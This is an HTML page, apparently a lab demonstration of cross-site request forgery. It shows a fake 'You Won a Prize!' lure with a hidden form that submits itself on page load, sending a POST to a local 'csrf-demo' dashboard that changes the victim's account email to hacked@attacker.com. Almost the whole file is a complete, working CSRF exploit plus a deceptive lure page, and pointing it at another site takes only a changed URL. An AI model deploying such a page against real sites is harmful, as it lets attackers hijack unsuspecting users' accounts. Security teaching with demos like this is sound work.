<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>You Won a Prize!</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    font-family: 'Segoe UI', system-ui, sans-serif;
    background: linear-gradient(135deg, #ff6a00, #ee0979);
    height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    text-align: center;
  }
  .card {
    background: white;
    padding: 50px 40px;
    border-radius: 20px;
    box-shadow: 0 20px 50px rgba(0,0,0,0.3);
    max-width: 420px;
  }
  h1 { font-size: 26px; color: #ee0979; margin-bottom: 12px; }
  p { color: #555; font-size: 14px; line-height: 1.6; }
</style>
</head>
<body>
  <div class="card">
    <h1>🎉 Congratulations!</h1>
    <p>You've won a free prize! Click anywhere to claim it.</p>
    <p style="margin-top:16px; font-size:12px; color:#999;">(This page looks harmless — but it's not.)</p>
  </div>

  <!-- HIDDEN CSRF ATTACK FORM -->
  <form id="csrf-form" action="http://localhost/csrf-demo/dashboard.php" method="POST" style="display:none;">
    <input type="email" name="new_email" value="hacked@attacker.com">
  </form>

  <script>
    // Auto-submits the hidden form the instant this page loads
    document.getElementById('csrf-form').submit();
  </script>
</body>
</html>
